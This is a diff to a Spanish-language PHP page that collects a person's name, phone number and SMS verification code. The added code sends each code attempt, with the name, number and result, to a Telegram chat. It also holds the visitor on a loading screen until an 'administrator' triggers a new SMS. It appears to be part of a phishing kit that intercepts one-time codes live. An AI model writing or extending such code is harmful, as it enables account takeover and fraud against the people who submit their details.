@@ -92,8 +92,9 @@ if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === 
     $ciudad  = trim($_POST['ciudad']);
     $celular = trim($_POST['celular']);
 
-    // Guardar teléfono en sesión para validación posterior
+    // Guardar datos en sesión para validación posterior y avisos
     $_SESSION['celular'] = $celular;
+    $_SESSION['nombre']  = $nombre;
 
     // Generar código de verificación de 6 dígitos
     $codigo = random_int(100000, 999999);
@@ -128,19 +129,34 @@ if ($accion === 'pedir_sms' && isset($_SESSION['codigo_sms'])) {
     // Lugar para integrar envío de SMS real con $_SESSION['codigo_sms']
 }
 
-$mensajeConfirmacion = '';
+$mensajeConfirmacion = $_SESSION['mensaje_error'] ?? '';
+unset($_SESSION['mensaje_error']);
 $estadoConfirmado = false;
 
 if ($accion === 'confirmar' && $codigoIngresado !== null) {
     $telefono = $_SESSION['celular'] ?? null;
+    $nombre   = $_SESSION['nombre']  ?? '';
     $codigoGuardado = $telefono ? obtenerCodigo($telefono) : null;
+
+    $log = "Intento de código:\n" .
+           "Nombre: $nombre\n" .
+           "Celular: $telefono\n" .
+           "Código ingresado: $codigoIngresado";
+
     if ($telefono !== null && $codigoGuardado !== null && $codigoIngresado === (string)$codigoGuardado) {
         $estadoConfirmado = true;
         $mensajeConfirmacion = 'Listo, tu solicitud ha sido confirmada.';
         borrarCodigo($telefono);
+        $log .= "\nResultado: CORRECTO";
     } else {
         $mensajeConfirmacion = 'El código no es válido. Inténtalo nuevamente.';
+        $_SESSION['mensaje_error'] = $mensajeConfirmacion;
+        // Volver a pantalla de carga hasta que el administrador pida un nuevo SMS
+        $mostrarPantallaCarga = true;
+        $log .= "\nResultado: INCORRECTO";
     }
+
+    enviarATelegram($BOT_TOKEN, $CHAT_ID, $log);
 }
 ?><!doctype html>
 <html lang="es">
